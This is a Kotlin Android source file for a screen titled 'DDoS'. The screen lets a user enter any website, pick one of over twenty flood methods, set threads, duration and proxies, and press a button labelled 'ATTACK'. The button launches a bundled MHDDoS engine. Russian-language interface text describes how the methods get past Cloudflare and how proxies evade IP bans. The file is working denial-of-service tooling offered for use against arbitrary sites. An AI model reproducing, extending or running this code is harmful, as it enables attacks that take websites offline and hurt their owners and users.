package com.toolkit.app

import androidx.activity.compose.BackHandler
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.StrokeJoin
import androidx.compose.ui.graphics.drawscope.Fill
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.toolkit.app.ui.Accent
import com.toolkit.app.ui.AccentSoft
import com.toolkit.app.ui.BorderGlass
import com.toolkit.app.ui.GlassCard
import com.toolkit.app.ui.OkGreen
import com.toolkit.app.ui.TextDim
import com.toolkit.app.ui.TextMain
import com.toolkit.app.ui.WarnOrange
import com.toolkit.app.ui.flatButtonElevation
import java.text.SimpleDateFormat
import java.util.*

private val ansiStrip = Regex("\u001B\\[[0-9;]*[A-Za-z]")

private val DDoS_METHODS = listOf(
    "BYPASS", "GET", "POST", "HEAD", "CFB", "CFBUAM", "AVB",
    "SLOW", "RHEX", "STOMP", "PPS", "KILLER", "DGB", "OVH",
    "STRESS", "DYN", "COOKIE", "NULL", "EVEN", "GSB",
    "APACHE", "XMLRPC", "DOWNLOADER",
)

private data class DdosLogLine(val text: String, val color: Color)

@Composable
fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
    val alpha = if (animated) {
        val t = rememberInfiniteTransition(label = "ddos")
        val a = t.animateFloat(
            initialValue = 0.35f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(tween(650), RepeatMode.Reverse),
            label = "pulse",
        )
        a.value
    } else 1f
    Canvas(modifier = modifier) {
        val w = size.width
        val h = size.height
        val path = Path().apply {
            moveTo(w * 0.58f, h * 0.02f)
            lineTo(w * 0.18f, h * 0.60f)
            lineTo(w * 0.46f, h * 0.60f)
            lineTo(w * 0.42f, h * 0.98f)
            lineTo(w * 0.84f, h * 0.42f)
            lineTo(w * 0.55f, h * 0.42f)
            close()
        }
        drawPath(
            path,
            color.copy(alpha = alpha),
            style = Stroke(width = w * 0.09f, cap = StrokeCap.Round, join = StrokeJoin.Round),
        )
        drawPath(path, color.copy(alpha = alpha * 0.16f), style = Fill)
    }
}

@Composable
fun DdosScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var url by remember { mutableStateOf("https://example.com") }
    var method by remember { mutableStateOf("BYPASS") }
    var threads by remember { mutableStateOf("30") }
    var duration by remember { mutableStateOf("60") }
    var proxText by remember { mutableStateOf("") }
    var running by remember { mutableStateOf(false) }
    val logs = remember { mutableStateListOf<DdosLogLine>() }
    val listState = rememberLazyListState()
    val outBuffer = remember { StringBuilder() }

    BackHandler(enabled = true, onBack = onBack)

    fun addLog(text: String, color: Color = TextDim) {
        val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        logs.add(DdosLogLine("[$ts] $text", color))
        if (logs.size > 150) logs.removeAt(0)
    }

    LaunchedEffect(logs.size) {
        if (logs.isNotEmpty()) runCatching { listState.scrollToItem(logs.size - 1) }
    }

    fun stopDdos() {
        running = false
        TerminalIO.cancel()
        addLog("Останавливаю…", WarnOrange)
    }

    fun startDdos() {
        val raw = url.trim()
        if (raw.isEmpty()) {
            addLog("Введите адрес сайта", WarnOrange)
            return
        }
        val t = threads.trim().toIntOrNull() ?: 30
        val d = duration.trim().toIntOrNull() ?: 60
        logs.clear()
        outBuffer.clear()
        running = true
        TerminalIO.onAppend = { chunk ->
            synchronized(outBuffer) {
                outBuffer.append(chunk)
                if (outBuffer.length > 300_000) outBuffer.delete(0, 150_000)
                val text = outBuffer.toString()
                val lines = text.split("\n")
                if (lines.size > 1) {
                    for (i in 0 until lines.size - 1) {
                        val line = ansiStrip.replace(processTerminal(lines[i]).trimEnd('\r'), "")
                        if (line.isNotBlank()) {
                            val color = when {
                                line.contains("ЗАПУЩЕНА") || line.contains("прокси:") -> AccentSoft
                                line.contains("остановлено") || line.contains("завершена") -> WarnOrange
                                line.contains("ошибк") || line.contains("не удалось") ||
                                    line.contains("не поддерживается") -> Color(0xFFFF6B6B)
                                else -> TextDim
                            }
                            logs.add(DdosLogLine(line, color))
                            if (logs.size > 150) logs.removeAt(0)
                        }
                    }
                    outBuffer.clear()
                    outBuffer.append(lines.last())
                }
            }
        }
        TerminalIO.onFinished = {
            running = false
            val rest = ansiStrip.replace(
                synchronized(outBuffer) { outBuffer.toString().trimEnd('\n', '\r') },
                "",
            )
            if (rest.isNotBlank()) logs.add(DdosLogLine(rest, TextDim))
            outBuffer.clear()
        }
        TerminalIO.onProgress = null
        TerminalIO.clearInput()
        addLog("Запуск MHDDoS: $method $raw", AccentSoft)
        addLog("Потоков: $t · время: $d c · прокси: ${if (proxText.isBlank()) "нет (прямое соединение)" else proxText}", TextDim)
        PythonRunner.runModule(ctx, "mhddos_launcher", listOf(raw, method, t.toString(), "1", d.toString(), proxText))
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp, vertical = 18.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                modifier = Modifier
                    .size(40.dp)
                    .clip(CircleShape)
                    .clickable(onClick = onBack),
                contentAlignment = Alignment.Center,
            ) {
                Icon(
                    Icons.AutoMirrored.Filled.ArrowBack,
                    contentDescription = "Назад",
                    tint = TextMain,
                    modifier = Modifier.size(22.dp),
                )
            }
            Spacer(Modifier.width(6.dp))
            Text(
                "DDoS",
                color = TextMain,
                fontSize = 22.sp,
                fontWeight = FontWeight.Bold,
            )
            Spacer(Modifier.weight(1f))
            DdosIcon(
                modifier = Modifier.size(30.dp),
                color = if (running) AccentSoft else Accent,
                animated = running,
            )
        }

        Spacer(Modifier.height(14.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(16.dp)) {
                Text(
                    "MHDDoS — движок атак с открытым исходным кодом, встроен в приложение целиком.",
                    color = TextMain,
                    fontSize = 13.sp,
                    lineHeight = 18.sp,
                )
                Spacer(Modifier.height(10.dp))
                Text(
                    "• BYPASS — обход Cloudflare/защит, поток сырых HTTP-запросов.\n" +
                        "• CFB/CFBUAM — Cloudflare-флуд через cloudscraper.\n" +
                        "• BOT — боты с куками; SLOW — медленный POST; RHEX/STOMP — случайные данные.\n" +
                        "• PPS — пакеты-гиганты; KILLER — прицельно по CPU; XMLRPC — пинг-атака WordPress.\n" +
                        "• Прокси (свои или встроенный пул) обходят бан по IP — Vercel и другие блокируют ваш IP, а не заголовки.",
                    color = TextDim,
                    fontSize = 12.sp,
                    lineHeight = 17.sp,
                )
            }
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier.padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                OutlinedTextField(
                    value = url,
                    onValueChange = { url = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("Сайт (https://)", color = TextDim, fontSize = 13.sp) },
                    placeholder = { Text("https://site.com", color = TextDim.copy(alpha = 0.5f), fontSize = 13.sp) },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 15.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Uri,
                        imeAction = ImeAction.Next,
                    ),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
                Spacer(Modifier.width(12.dp))
                Button(
                    onClick = { if (running) stopDdos() else startDdos() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (running) Color(0xFFB3261E) else Accent,
                        contentColor = if (running) Color.White else Color(0xFF0E1013),
                    ),
                    shape = RoundedCornerShape(14.dp),
                    elevation = flatButtonElevation(),
                    modifier = Modifier.height(54.dp),
                ) {
                    Text(
                        if (running) "СТОП" else "АТАКА",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 1.sp,
                    )
                }
            }
        }

        Spacer(Modifier.height(10.dp))
        Text("Метод атаки", color = TextDim, fontSize = 12.sp)
        Spacer(Modifier.height(6.dp))
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState()),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            DDoS_METHODS.forEach { m ->
                val selected = m == method
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(12.dp))
                        .background(if (selected) Accent else Color(0x14FFFFFF))
                        .clickable { method = m }
                        .padding(horizontal = 12.dp, vertical = 7.dp),
                ) {
                    Text(
                        m,
                        color = if (selected) Color(0xFF0E1013) else TextDim,
                        fontSize = 12.sp,
                        fontWeight = if (selected) FontWeight.Bold else FontWeight.Medium,
                        fontFamily = FontFamily.Monospace,
                    )
                }
                Spacer(Modifier.width(8.dp))
            }
        }

        Spacer(Modifier.height(10.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Row(Modifier.padding(14.dp)) {
                OutlinedTextField(
                    value = threads,
                    onValueChange = { threads = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("Потоки", color = TextDim, fontSize = 13.sp) },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 14.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Number,
                        imeAction = ImeAction.Next,
                    ),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
                Spacer(Modifier.width(10.dp))
                OutlinedTextField(
                    value = duration,
                    onValueChange = { duration = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("Время, сек", color = TextDim, fontSize = 13.sp) },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 14.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Number,
                        imeAction = ImeAction.Done,
                    ),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
            }
        }

        Spacer(Modifier.height(10.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier.padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                OutlinedTextField(
                    value = proxText,
                    onValueChange = { proxText = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("Прокси (свои, необязательно)", color = TextDim, fontSize = 13.sp) },
                    placeholder = {
                        Text("socks5://ip:port,http://ip:port,user:pass@ip:port", color = TextDim.copy(alpha = 0.5f), fontSize = 12.sp)
                    },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 14.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Uri,
                        imeAction = ImeAction.Done,
                    ),
                    keyboardActions = KeyboardActions(onDone = { if (!running) startDdos() }),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
            }
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(14.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        "Логи",
                        color = TextMain,
                        fontSize = 14.sp,
                        fontWeight = FontWeight.SemiBold,
                    )
                    Spacer(Modifier.weight(1f))
                    if (running) {
                        Text(
                            "АТАКА ИДЁТ",
                            color = OkGreen,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                        )
                    }
                }
                Spacer(Modifier.height(6.dp))
                if (logs.isEmpty()) {
                    Text(
                        "Вставьте адрес сайта и жмите АТАКА — здесь появится лог.",
                        color = TextDim,
                        fontSize = 12.sp,
                    )
                } else {
                    LazyColumn(
                        state = listState,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(220.dp),
                    ) {
                        items(logs.size) { i ->
                            val l = logs[i]
                            Text(
                                l.text,
                                color = l.color,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 12.sp,
                                lineHeight = 16.sp,
                            )
                        }
                    }
                }
            }
        }
    }
}